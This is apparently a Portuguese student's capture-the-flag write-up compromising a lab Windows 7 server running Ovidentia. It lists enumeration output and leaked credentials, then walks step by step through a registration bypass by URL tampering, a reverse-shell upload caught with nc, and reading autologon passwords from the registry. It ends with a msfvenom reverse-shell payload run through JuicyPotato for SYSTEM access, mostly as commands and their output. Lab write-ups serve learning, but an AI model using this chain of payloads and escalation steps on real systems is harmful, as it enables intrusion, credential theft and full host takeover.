512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:User
  332                   running               wininit.exe                                                     
  344                   running               csrss.exe             %SystemRoot%\system32\  ObjectDirectory=\Windows SharedSection=1024,12288,
512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:User

        
  3740                  running               slui.exe                                                        
  3828                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\                      
  4068                  running               dllhost.exe                                                     
  4436                  running               msdtc.exe                                                       
  4636                  running               java.exe                                                        
  4672                  running               WmiPrvSE.exe                                                    
  5112                  running               httpd.exe             C:\wamp\bin\apache\apache2.4.9\bin\  -d C:/wamp/bin/apache/apache2.4.9
  5144                  running               dwm.exe               C:\Windows\system32\                      
  5152                  running               explorer.exe          C:\Windows\                               
  5256                  running               tvnserver.exe         C:\Program Files\TightVNC\  -controlservice -slave
  5276                  running               wampmanager.exe       C:\wamp\                                  
  5580                  running               svchost.exe                                                     
  5676                  running               wmpnetwk.exe                                                    

[*] Software components:

  Index                 Name                
  1                     LiveUpdate 3.3 (Symantec Corporation)
  2                     SPICE Guest Tools 0.141
  3                     WampServer 2.5      
  4                     VMware Tools        
  5                     Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148
  6                     Microsoft Visual C++ 2012 Redistributable (x86) - 11.0.61030
  7                     Microsoft Visual C++ 2017 Redistributable (x86) - 14.12.25810
  8                     Microsoft Visual C++ 2017 x86 Additional Runtime - 14.12.25810
  9                     Microsoft Visual C++ 2017 x86 Minimum Runtime - 14.12.25810
  10                    Microsoft Visual C++ 2012 x86 Additional Runtime - 11.0.61030
  11                    Microsoft Visual C++ 2012 x86 Minimum Runtime - 11.0.61030
  12                    QEMU guest agent    
  13                    Symantec Endpoint Protection Manager
  14                    TightVNC            

[*] Share:

   Name                         : Users
    Path                        : C:\Users
    Comment                     : 
</pre>

># Informações extras encontradas


    Nome da aplicação: Ovidentia
    
    Possíveis usuários:
        capmarcossilva

Outras encontradas:
<pre>
$babDBHost = "localhost"; /* MySql database server */
$babDBLogin = "ovuser"; /* MySql database login */
$babDBPasswd = "securepass"; /* MySql database password */
$babDBName ="ovidentia"; /* MySql database name */
$babUrl = "http://yourdomain.com/"; /* url to access to your site */

        Login with the following data at the prompt:
	User    : admin@admin.bab
	Password: 012345678
</pre>


Links:

http://192.168.90.80:8080/PHP/skins/theme_default/ovml/test.html

http://192.168.90.80:8080/PHP/skins/theme_default/ovml/%3COVPostUrl%20htmlentities=

http://192.168.90.80:8080/PHP/index.php?babrw=root/DGAll/babUser/babUserSection/babUserFm

http://192.168.90.80:8080/PHP/skins/theme_default/templates/page.html#

http://url-to-access-your-site/index.php?tg=version&idx=addons&from=ovidentia_old

http://url-to-access-your-site/index.php?tg=contact&idx=modify&item=-99999' 

http://url-to-access-your-site/index.php?tg=login&referer=index.php&login=login&sAuthType=Ovidentia&nickname=admin&password=123&submit=Login

http://192.168.90.80:8080/PHP/filemanager/users/U1/Germano/

http://192.168.90.80:8080/testmysql.php

># Exploração

Conforme inumeração, encontrei a seguinte página:

http://192.168.90.80:8080/PHP/

Nela estava disponível o sistema "OVIDENTIA"

Fuçando, encontrei a url para login:

http://192.168.90.80:8080/PHP/index.php?tg=login&cmd=authform&msg=You+must+be+logged+in+to+access+this+page.&err=

Encontrei também na enumeração, uma url contendo arquivos de shell reverso no nome de GERMANO:

http://192.168.90.80:8080/PHP/filemanager/users/U1/Germano/

Encontrei uma página de registro de usuário, mas ela pedia confirmação mas não enviava a confirmação para o email:

http://192.168.90.80:8080/PHP/index.php?tg=login&cmd=register

(h)
Na aba "directory" havia a possibilidade de fazer upload de arquivos mas não havia conseguido fazer nada demais com ela. Com ajuda, descobri que clicando com o botão direito no "add" e mandando abrir a janela flutuante em uma nova aba, era possível manipular a url. Possibilitando assim a criação de um usuário sem confirmação via email:
<pre>
http://192.168.90.80:8080/PHP/index.php?tg=directory&idx=adbc&id=2
</pre>
Bastava mudar o id para "1":

http://192.168.90.80:8080/PHP/index.php?tg=directory&idx=adbc&id=1

Assim só precisava preencher alguns campos e logo seria criado um usuário novo.

<pre>
Login ID:
Password:
Retype Password:
Last Name:
Middle Name:
First Name:
E-mail Address: 
</pre>

Voltando agora à página de login, loguei com sucesso. Na aba "File manager" encontrei um novo diretório "Personal Folder" que possuia a opção de upload de arquivos. Esse sim funcionava:

http://192.168.90.80:8080/PHP/index.php?tg=fileman&idx=displayAddFileForm&id=2&gr=N&path=

Para executar os arquivos upados, precisei procura-los nos diretórios enumerádos. A pista mais quente que eu tinha, era a pasta do "Germando" e foi por lá que encontrei o pponto de execução:

http://192.168.90.80:8080/PHP/filemanager/users/U2/

"U2" é o nosso usuário 2. Tendo encontrado o shellreverso que enviei, bastou clicar nele e logo me foi entregue um shell na porta previamente setada:


<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀aluno</b></font><font color="#367BF0">)-[</font><b>/home/aluno</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">nc</font> <font color="#9755B3">-lvnp</font> 10025                                                                              
Listening on 0.0.0.0 10025
Connection received on 192.168.90.80 49298
SOCKET: Shell has connected! PID: 508
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

PS C:\wamp\www\PHP\fileManager\users\U2&gt; whoami
101ciaavl\jill

PS C:\wamp\www\PHP\fileManager\users\U2&gt; cd \users\jill\Desktop
PS C:\users\jill\Desktop&gt; dir


    Directory: C:\users\jill\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          7/1/2021   2:01 PM         37 flag.txt                          


PS C:\users\jill\Desktop&gt; type flag.txt
<font color="GOLD">CTF{a4d2b4cf7b096c2c734e6ababd71a916}</font>
</pre>

># Escalação Priv.

Informações de logon Windows nas Chaves. Comando:
<pre>C:\wamp\www\PHP\fileManager\users\U2&gt;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
</pre>
Retorno:
<pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x2b
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    jill
    DefaultPassword    REG_SZ    hill
</pre>

Verifiquei que o usuário "admin" está ativo e aparentemente não pede senha. Mas não soube usar! (VERIFICAR E ESTUDAR!!!???)

<pre>net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.

net user admin
User name                    admin
Full Name                    
Comment                      
User&apos;s comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/21/2020 3:54:01 PM
Password expires             Never
Password changeable          6/21/2020 3:54:01 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   3/21/2022 7:46:12 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *HomeUsers            
Global Group memberships     *None                 
The command completed successfully.
</pre>

Verificando os privilegios do usuário atual:

<pre>C:\wamp\www\PHP\fileManager\users\U2&gt;whoami/priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
<font color="GOLD">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </font>
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
</pre>

Verifiquei a presença do token "SeImpersonatePrivilege" que me permitirá escalar privilégios com ajuda do "juicyPotato.exe".

Gerei o payload de shellreverso para o JP executar:

<pre><font color="#5EBDAB">┌──(</font><font color="#277FFF"><b>aluno㉿aluno</b></font><font color="#5EBDAB">)-[</font><b>~</b><font color="#5EBDAB">]</font>
<font color="#5EBDAB">└─</font><font color="#277FFF"><b>$</b></font> <font color="#5EBDAB">msfvenom</font> <font color="#9755B3">-p</font> windows/shell_reverse_tcp lhost=192.168.80.109 lport=1111 <font color="#9755B3">-f</font> exe <font color="#277FFF"><b>&gt;</b></font> exploit1111.exe                                                                                                                                     

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
</pre>

Joguei o "juicyPotato.exe" e o payload gerado no "MysfVenom" para dentro do servidor pelo mesmo ponto de entrada anterior e o executei:

* Links para o JuicyPotato:
  * Normal: https://github.com/ohpe/juicy-potato/releases
  * X86: https://github.com/ivanitlearning/Juicy-Potato-x86/releases

Obs: Não foi possível executar o JP normal. Apresentava erro de arquitetura, com isso procuramos o x86.

Erro:

<pre>C:\wamp\www\PHP\fileManager\users\U2&gt;C:\wamp\www\PHP\fileManager\users\U2\JuicyPotato.exe -t * -p C:\wamp\www\PHP\fileManager\users\U2\revshell_leg.exe -l 11
This version of C:\wamp\www\PHP\fileManager\users\U2\JuicyPotato.exe is not compatible with the version of Windows you&apos;re running. Check your computer&apos;s system information to see whether <font color="RED">you need a x86 (32-bit) or x64 (64-bit) version </font>of the program, and then contact the software publisher.
</pre>

Já o JuicyPotato.x86 funcionou, em partes, corretamente :

<pre>C:\wamp\www\PHP\fileManager\users\U2&gt;C:\wamp\www\PHP\fileManager\users\U2\Juicy.Potato.x86.exe -t * -p C:\wamp\www\PHP\fileManager\users\U2\revshell_leg.exe -l 12
<font color="RED">Testing {4991D34B-80A1-4291-B697-000000000000} 12
COM -&gt; recv failed with error: 10038</font>
</pre>

Dessa vez o erro era de "CLSID". O comando não estava aceitando a chave. Pesquisando no github, encontrei uma página com diversas chaves.

https://github.com/ohpe/juicy-potato/tree/master/CLSID

Bastava achar uma que funcionasse no windows que estavamos explorando.

Com o comando "systeminfo" verificamos se tratar de um Win 7:

<pre>systeminfo

Host Name:                 101CIAAVL
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          admin
</pre>

No link de IDs para win7, encontramos diversas chaves:

https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise

Essas eram as de system:

<pre>
LocalService 		        CLSID 	                                User
ShellHWDetection 		{555F3418-D99E-4E51-800A-6E89CFD8B1D7} 	NT AUTHORITY\SYSTEM
BITS 	  	                <font color="GOLD">{03ca98d6-ff5d-49b8-abc6-03dd84127020}</font> 	NT AUTHORITY\SYSTEM
BITS 	  	                {F087771F-D74F-4C1A-BB8A-E16ACA9124EA} 	NT AUTHORITY\SYSTEM
BITS 	  	                {6d18ad12-bde3-4393-b311-099c346e6df9} 	NT AUTHORITY\SYSTEM
BITS 	  	                {4991d34b-80a1-4291-83b6-3328366b9097} 	NT AUTHORITY\SYSTEM
BITS 	  	                {69AD4AEE-51BE-439b-A92C-86AE490E8B30}  NT AUTHORITY\SYSTEM
BITS 	  	                {659cdea7-489e-11d9-a9cd-000d56965251} 	NT AUTHORITY\SYSTEM
</pre>

A segunda funcionou para mim:

<pre><font color="#5EBDAB">C:\wamp\www\PHP\fileManager\users\U2\Juicy.Potato.x86.exe -t * -p C:\wamp\www\PHP\fileManager\users\U2\exploit1111.exe -l 11 -c &apos;{03ca98d6-ff5d-49b8-abc6-03dd84127020}&apos;</font>

Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 11
......
[+] authresult 0
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
</pre>

Logo recebi o shell reverso na outra prota "1111" configurada no payload do msfvenon:

<pre><font color="#5EBDAB">┌──(</font><font color="#277FFF"><b>aluno㉿aluno</b></font><font color="#5EBDAB">)-[</font><b>~</b><font color="#5EBDAB">]</font>
<font color="#5EBDAB">└─</font><font color="#277FFF"><b>$</b></font> <font color="#5EBDAB">nc</font> <font color="#9755B3">-lnvp</font> 1111 
Listening on 0.0.0.0 1111
Connection received on 192.168.90.80 49898
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;
</pre>

Sendo assim, bastou encontrar a flag:

<pre>
C:\Users\admin&gt;type Desktop\flag.txt
type Desktop\flag.txt
<font color="GOLD">CTF{br484-5e}</font>
</pre>

fim
